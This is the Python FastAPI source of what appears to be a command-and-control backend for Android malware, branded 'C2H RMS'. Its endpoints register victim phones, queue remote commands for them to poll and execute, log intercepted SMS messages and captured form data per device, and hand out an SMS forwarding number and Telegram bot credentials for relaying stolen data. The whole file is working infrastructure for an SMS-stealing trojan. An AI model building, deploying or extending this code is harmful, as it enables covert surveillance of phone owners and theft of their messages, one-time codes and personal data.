import uvicorn
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta, timezone
import sqlite3
import json
from fastapi.responses import HTMLResponse

# --- Configuration ---
DATABASE_URL = "rms.db"
ONLINE_THRESHOLD_SECONDS = 20

# --- Database Initialization ---
def get_db_connection():
    conn = sqlite3.connect(DATABASE_URL, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def now_utc_string():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL
        );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_device_id ON devices (device_id);")

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    """)
    
    conn.commit()
    conn.close()

init_db()

# --- Pydantic Models ---
class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None

class DeviceResponse(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None
    is_online: bool
    created_at: str

class SmsForwardConfigRequest(BaseModel):
    forward_number: str

class TelegramConfigRequest(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

class SendCommandRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: Dict[str, Any]

class FormSubmissionRequest(BaseModel):
    custom_data: str

class SmsLogRequest(BaseModel):
    sender: str
    message_body: str

# --- FastAPI Application ---
app = FastAPI(
    title="C2H Android RMS Backend",
    description="Fully corrected and optimized backend for C2H Panel.",
    version="3.0.0" # Version 3.0
)

# --- API Endpoints ---

@app.get("/")
async def root():
    return {"status": "ok", "message": "C2H RMS Backend is running perfectly."}

@app.post("/api/device/register")
async def register_device(data: DeviceRegisterRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    current_time_str = now_utc_string()
    clean_device_id = data.device_id.strip()

    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    
    if device:
        cursor.execute(
            """
            UPDATE devices 
            SET device_name = ?, os_version = ?, phone_number = ?, battery_level = ?, last_seen = ?
            WHERE device_id = ?
            """,
            (
                data.device_name, data.os_version, data.phone_number, 
                data.battery_level, current_time_str, clean_device_id
            )
        )
    else:
        cursor.execute(
            """
            INSERT INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                clean_device_id, data.device_name, data.os_version, 
                data.phone_number, data.battery_level, current_time_str, current_time_str
            )
        )
        
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Device data updated successfully."}

@app.get("/api/devices", response_model=List[DeviceResponse])
async def get_devices():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices ORDER BY created_at ASC")
    devices = cursor.fetchall()
    response_list = []
    current_time_utc = datetime.now(timezone.utc)
    for device in devices:
        try:
            last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        except (ValueError, TypeError):
            last_seen_dt = current_time_utc - timedelta(days=1)
        is_online = (current_time_utc - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
        response_list.append(DeviceResponse(
            device_id=device['device_id'],
            device_name=device['device_name'],
            os_version=device['os_version'],
            phone_number=device['phone_number'],
            battery_level=device['battery_level'],
            is_online=is_online,
            created_at=device['created_at']
        ))
    conn.close()
    return response_list

# --- CONFIGURATION ENDPOINTS (PANEL -> SERVER) ---

@app.post("/api/config/sms_forward")
async def update_sms_forward_config(data: SmsForwardConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO global_settings (setting_key, setting_value) VALUES (?, ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value=excluded.setting_value",
        ('sms_forward_number', data.forward_number)
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Forwarding number updated."}

@app.post("/api/config/telegram")
async def update_telegram_config(data: TelegramConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    settings = {'telegram_bot_token': data.telegram_bot_token, 'telegram_chat_id': data.telegram_chat_id}
    for key, value in settings.items():
        cursor.execute(
            "INSERT INTO global_settings (setting_key, setting_value) VALUES (?, ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value=excluded.setting_value",
            (key, value)
        )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Telegram config updated."}

# --- CONFIGURATION ENDPOINTS (CLIENT APK -> SERVER) ---
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★-
# ★★★ समाधान: यह पुराने और नए, दोनों तरह के क्लाइंट APK को सपोर्ट करेगा ★★★
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★-
@app.get("/api/config/sms_forward")
@app.get("/api/device/{device_id}/sms_forward")
async def get_sms_forward_config_combined(device_id: Optional[str] = None):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
    result = cursor.fetchone()
    conn.close()
    return {"forward_number": result['setting_value'] if result else ""}

@app.get("/api/config/telegram")
async def get_telegram_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    keys = ['telegram_bot_token', 'telegram_chat_id']
    results = {}
    for key in keys:
        cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", (key,))
        result = cursor.fetchone()
        results[key] = result['setting_value'] if result else ""
    conn.close()
    return results

# --- OTHER ENDPOINTS (No changes needed below this line) ---

@app.post("/api/command/send")
async def send_command(data: SendCommandRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO commands (device_id, command_type, command_data, created_at) VALUES (?, ?, ?, ?)",
        (data.device_id.strip(), data.command_type, json.dumps(data.command_data), now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Command sent."}

@app.post("/api/device/{device_id}/forms")
async def submit_form(device_id: str, data: FormSubmissionRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES (?, ?, ?)",
        (device_id.strip(), data.custom_data, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Form data submitted."}

@app.post("/api/device/{device_id}/sms")
async def log_sms(device_id: str, data: SmsLogRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES (?, ?, ?, ?)",
        (device_id.strip(), data.sender, data.message_body, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "SMS logged."}

@app.get("/api/device/{device_id}/commands")
async def get_pending_commands(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
        (device_id.strip(),)
    )
    commands = cursor.fetchall()
    command_list = [{"id": cmd['id'], "command_type": cmd['command_type'], "command_data": cmd['command_data']} for cmd in commands]
    if command_list:
        command_ids = [cmd['id'] for cmd in command_list]
        placeholders = ','.join('?' * len(command_ids))
        cursor.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", command_ids)
        conn.commit()
    conn.close()
    return command_list

@app.post("/api/command/{command_id}/execute")
async def mark_command_executed(command_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (command_id,))
    conn.commit()
    conn.close()
    return {"status": "success", "message": f"Command {command_id} executed."}

@app.delete("/api/device/{device_id}")
async def delete_device(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    clean_device_id = device_id.strip()
    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    if not device:
        conn.close()
        raise HTTPException(status_code=404, detail="Device not found.")
    
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM sms_logs WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM form_submissions WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM commands WHERE device_id = ?", (clean_device_id,))
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Device and all data deleted."}

@app.delete("/api/sms/{sms_id}")
async def delete_sms_log(sms_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sms_logs WHERE id = ?", (sms_id,))
    if cursor.rowcount == 0:
        conn.close()
        raise HTTPException(status_code=404, detail="SMS log not found.")
    conn.commit()
    conn.close()
    return {"status": "success", "message": f"SMS log {sms_id} deleted."}

@app.get("/api/device/{device_id}/forms")
async def get_form_submissions(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC", (device_id.strip(),))
    forms = cursor.fetchall()
    conn.close()
    return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]

@app.get("/api/device/{device_id}/sms")
async def get_sms_logs(device_id: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC", (device_id.strip(),))
    sms_logs = cursor.fetchall()
    conn.close()
    return [{"id": sms['id'], "sender": sms['sender'], "message_body": sms['message_body'], "received_at": sms['received_at']} for sms in sms_logs]

@app.get("/status", response_class=HTMLResponse, include_in_schema=False)
async def status_check():
    return """
    <!DOCTYPE html><html><head><title>C2H RMS Status</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#121212;color:#fff}.container{text-align:center;padding:40px;border-radius:15px;background-color:#1e1e1e;box-shadow:0 10px 25px rgba(0,0,0,0.5)}h1{color:#00bfff;margin-bottom:10px}p{color:#b0b0b0}a{color:#7b1fa2}</style></head><body><div class="container"><h1>✅ C2H RMS Backend is Running</h1><p>The server is deployed and fully operational.</p><p>API Documentation available at <a href="/docs">/docs</a>.</p></div></body></html>
    """

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)

